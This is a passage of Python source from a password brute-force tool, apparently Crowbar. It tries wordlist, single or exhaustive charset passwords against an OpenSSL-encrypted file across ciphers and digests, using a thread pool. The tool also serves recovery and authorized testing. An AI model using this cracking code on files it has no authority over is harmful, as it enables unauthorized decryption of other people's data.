                    minimum_character = 1
                
                maximum_character -= len(begin) + len(end)
                # ceiling = len(charset)

                total = 0
                for i in range(1, maximum_character + 1):
                    total += len(charset) ** i
                self.iter_required = total
                self.logger.output_file("Iteration(s) required: %s" % self.iter_required)

                total_time = time()

                count = 0
                while count < total:
                    
                    print("Password:[%s / %s]" % (
                        count, total), end="\033[K\r"
                    )

                    password = begin + self.dec_to_charset(count, charset) + end
                    pool.add_task(self.sslbrute, None, None, self.args.input_file, self.args.output_file, password, self.args.key_file)
                    count += 1
        
        else:

            # Default values
            if self.args.cipher_file:
                try:
                    c = open(self.args.cipher_file, "r", encoding="ISO-8859-1").read().splitlines()
                    for cipher in c:  # Check that all ciphers in file is valid
                        if cipher not in cipher_list:
                            mess = "Unknown cipher '%s' in file" % cipher
                            raise CrowbarExceptions(mess)
                    seen = set()  # Remove duplicates
                    seen_add = seen.add
                    c = [s for s in c if not (s in seen or seen_add(s))]
                except:
                    mess = "File: %s doesn't exists" % os.path.abspath(self.args.cipher_file)
                    raise CrowbarExceptions(mess)
            elif not self.args.cipher:
                c = ["aes-128-cbc"]  # Default cipher
            elif self.args.cipher in cipher_list:
                c = [self.args.cipher]
            elif self.args.cipher == "*":
                c = cipher_list
            else:
                mess = "Unknown cipher '%s'" % self.args.cipher
                raise CrowbarExceptions(mess)
            
            if self.args.message_digest_file:
                try:
                    d = open(self.args.message_digest_file, "r", encoding="ISO-8859-1").read().splitlines()
                    for digest in d:  # Check that all digests in file is valid
                        if digest not in d:
                            mess = "Unknown message digest '%s' in file" % digest
                            raise CrowbarExceptions(mess)
                    seen = set()  # Remove duplicates
                    seen_add = seen.add
                    d = [s for s in d if not (s in seen or seen_add(s))]
                except:
                    mess = "File: %s doesn't exists" % os.path.abspath(self.args.message_digest_file)
                    raise CrowbarExceptions(mess)
            elif not self.args.message_digest:
                d = ["sha256"]  # Default message digest
            elif self.args.message_digest in message_digest_list:
                d = [self.args.message_digest]
            elif self.args.message_digest == "*":
                d = message_digest_list
            else:
                mess = "Unknown message digest '%s'" % self.args.message_digest
                raise CrowbarExceptions(mess)
            
            # if not self.args.update_time:
            #     ut = 15  # Default update time
            # else:
            #     ut = float(self.args.update_time)
            
            # Create temporary work folder for decryption purposes to take place in
            temp_folder_name = "".join(random.choices(self.rand_char_string, k=16))
            temp_folder_path = os.path.join(os.getcwd(), temp_folder_name)
            
            tries = 0
            while os.path.exists(temp_folder_path):
                
                if tries >= 5:
                    mess = "Unable to create a temporary directory"
                    raise CrowbarExceptions(mess)

                temp_folder_name = "".join(random.choices(self.rand_char_string, k=16))
                temp_folder_path = os.path.join(os.getcwd(), temp_folder_name)
                tries += 1
            
            os.mkdir(temp_folder_path)
            
            if self.args.passwd_file:  # Password list provided

                try:
                    passwdfile = open(self.args.passwd_file, "r", encoding="ISO-8859-1").read().splitlines()
                except:
                    mess = "File: %s doesn't exists" % os.path.abspath(self.args.passwd_file)
                    raise CrowbarExceptions(mess)
                
                self.iter_required = len(c) * len(d) * len(passwdfile)
                self.logger.output_file("Iteration(s) required: %s" % self.iter_required)

                t = time()
                total_time = time()

                for cipher in c:
                    for digest in d:
                        for password in passwdfile:

                            # if time() - t >= ut:
                            #     current_iter = (c.index(cipher) * len(d) + d.index(digest)) * len(passwdfile) + passwdfile.index(password)
                            #     self.logger.output_file("Total:[%s / %s]  Cipher: %s [%s / %s]  Digest: %s [%s / %s]  Password:[%s / %s]" % (
                            #         current_iter, self.iter_required, cipher, c.index(cipher), len(c), digest, d.index(digest), len(d), passwdfile.index(password), len(passwdfile))
                            #     )
                            #     t = time()

                            current_iter = (c.index(cipher) * len(d) + d.index(digest)) * len(passwdfile) + passwdfile.index(password)
                            print("Total:[%s / %s]  Cipher: %s [%s / %s]  Digest: %s [%s / %s]  Password:[%s / %s]" % (
                                current_iter, self.iter_required, cipher, c.index(cipher), len(c), digest, d.index(digest), len(d), passwdfile.index(password), len(passwdfile)), end="\033[K\r"
                            )

                            # Create temporary work file containing encryption data for decryption purposes
                            temp_file = "".join(random.choices(self.rand_char_string, k=16))  + "_" + "_".join(password.split(" "))
                            temp_file_path = os.path.join(temp_folder_path, temp_file)

                            tries = 0
                            while os.path.exists(temp_file_path):
                                
                                if tries >= 5:
                                    mess = "Unable to create a temporary directory"
                                    raise CrowbarExceptions(mess)

                                temp_file = "".join(random.choices(self.rand_char_string, k=16))
                                temp_file_path = os.path.join(temp_folder_path, temp_file)
                                tries += 1
                            
                            with open(temp_file_path, "w") as f:
                                pass

                            pool.add_task(self.sslbrute, cipher, digest, self.args.input_file, temp_file_path, password, None)
                    
            elif self.args.passwd:  # Single password provided

                self.iter_required = len(c) * len(d) * 1
                self.logger.output_file("Iteration(s) required: %s" % self.iter_required)

                t = time()
                total_time = time()

                for cipher in c:
                    for digest in d:

                        # if time() - t >= ut:
                        #     current_iter = (c.index(cipher) * len(d) + d.index(digest))
                        #     self.logger.output_file("Total:[%s / %s]  Cipher: %s [%s / %s]  Digest: %d [%s / %s]" % (
                        #         current_iter, self.iter_required, cipher, c.index(cipher), len(c), digest, d.index(digest), len(d))
                        #     )
                        #     t = time()

                        current_iter = (c.index(cipher) * len(d) + d.index(digest))
                        print("Total:[%s / %s]  Cipher: %s [%s / %s]  Digest: %s [%s / %s]" % (
                            current_iter, self.iter_required, cipher, c.index(cipher), len(c), digest, d.index(digest), len(d)), end="\033[K\r"
                        )
                        
                        temp_file = "".join(random.choices(self.rand_char_string, k=16))  + "_" + self.args.passwd
                        temp_file_path = os.path.join(temp_folder_path, temp_file)

                        tries = 0
                        while os.path.exists(temp_file_path):
                            
                            if tries >= 5:
                                mess = "Unable to create a temporary directory"
                                raise CrowbarExceptions(mess)

                            temp_file = "".join(random.choices(self.rand_char_string, k=16))
                            temp_file_path = os.path.join(temp_folder_path, temp_file)
                            tries += 1
                        
                        with open(temp_file_path, "w") as f:
                            pass

                        pool.add_task(self.sslbrute, cipher, digest, self.args.input_file, temp_file_path, self.args.passwd, None)
            
            else:  # No password provided (Use charset to brute-force)

                if not self.args.min_char:
                    minimum_character = 1  # Default minimum character
                else:
                    minimum_character = int(self.args.min_char)

                if not self.args.max_char:
                    maximum_character = 16  # Default maximum character
                else:
                    maximum_character = int(self.args.max_char)
                
                if not self.args.charset:
                    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"  # Default charset
                else:
                    charset = str(self.args.charset)
                
                if not self.args.begin_with:
                    begin = ""  # Default beginning characters
                else:
                    begin = str(self.args.begin_with)
                
                if not self.args.end_with:
                    end = ""  # Default ending characters
                else:
                    end = str(self.args.end_with)
                
                # Run checks to ensure validity of arguments
                if minimum_character <= 0:
                    mess = "Minimum character cannot be lower or equal to 0!"
                    raise CrowbarExceptions(mess)
                elif minimum_character > maximum_character:
                    mess = "Minimum character specified cannot be lower than that maximum character!"
                    raise CrowbarExceptions(mess)
                elif len(begin) + len(end) >= maximum_character:
                    mess = "Length of beginning and ending characters cannot be same or more than the specified maximum number of characters!"
                    raise CrowbarExceptions(mess)

                if minimum_character > len(begin) + len(end):
                    minimum_character -= len(begin) + len(end)
                else:
                    minimum_character = 1
                
                maximum_character -= len(begin) + len(end)
                ceiling = len(charset)

                total = 0
                for i in range(1, maximum_character + 1):
                    total += len(charset) ** i
                self.iter_required = len(c) * len(d) * total
                self.logger.output_file("Iteration(s) required: %s" % self.iter_required)

                t = time()
                total_time = time()
                # count_in_one_second = 0
                # count_per_second = 0

                for cipher in c:
                    for digest in d:

                        count = 0  
                        while count < total:

                            # if time() - t > 1:
                            #     count_per_second = count_in_one_second
                            #     count_in_one_second = 0
                            #     t = time()

                            current_iter = (c.index(cipher) * len(d) + d.index(digest)) * total + count
                            print("Total:[%s / %s]  Cipher: %s [%s / %s]  Digest: %s [%s / %s]  Password:[%s / %s]" % (
                                current_iter, self.iter_required, cipher, c.index(cipher), len(c), digest, d.index(digest), len(d), count, total), end="\033[K\r"
                            )

                            password = begin + self.dec_to_charset(count, charset) + end

                            temp_file = "".join(random.choices(self.rand_char_string, k=16))  + "_" + password
                            temp_file_path = os.path.join(temp_folder_path, temp_file)

                            tries = 0
                            while os.path.exists(temp_file_path):
                                
                                if tries >= 5:
                                    mess = "Unable to create a temporary directory"
                                    raise CrowbarExceptions(mess)

                                temp_file = "".join(random.choices(self.rand_char_string, k=16))
                                temp_file_path = os.path.join(temp_folder_path, temp_file)
                                tries += 1
                            
                            with open(temp_file_path, "w") as f:
                                pass

                            pool.add_task(self.sslbrute, cipher, digest, self.args.input_file, temp_file_path, password, None)

                            count += 1
                            # count_in_one_second += 1  
           
        pool.wait_completion()

        time_taken = round(time() - total_time, 3)
        print("\033[K", end="\r")
        self.logger.output_file("Time taken (in seconds): %s second(s)" % time_taken)

        # Re-execute for correct password to ensure output file is decrypted properly using the correct password
        if not self.args.key_file:

            try:
                pool = ThreadPool(int(self.args.thread))
            except Exception as err:
                raise CrowbarExceptions(str(err))

            if self.ssl_password:
                pool.add_task(self.sslbrute, self.ssl_cipher, self.ssl_digest, self.args.input_file, self.args.output_file, self.ssl_password, None, output=False)

            os.rmdir(temp_folder_path)

            pool.wait_completion()

        else:
            
            if self.args.input_file:

                try:
                    pool = ThreadPool(int(self.args.thread))
                except Exception as err:
                    raise CrowbarExceptions(str(err))
                
                if self.ssl_password:
                    pool.add_task(self.sslbrute, None, None, self.args.input_file, self.args.output_file, self.ssl_password, self.args.key_file, output=False)
            
            os.remove("temptest.txt")

            pool.wait_completion()
    
    def dec_to_charset(self, n, charset):  # New password brute-force algorithm
        if n < len(charset):
            return charset[n]
        else:
            return self.dec_to_charset(n // len(charset) - 1, charset) + charset[n % len(charset)]

    def run(self, brute_type):
        signal.signal(signal.SIGINT, self.signal_handler)

        if not brute_type in self.services.keys():
            mess = "%s is not a valid service. Please select: %s" % (brute_type, self.services.keys())
            raise CrowbarExceptions(mess)
        else:
            self.services[brute_type]()
            self.logger.output_file("STOP")

            if Main.is_success == 0:
                self.logger.output_file("No results found...")

    def signal_handler(self, signal, frame):
        raise CrowbarExceptions("\nExiting...")
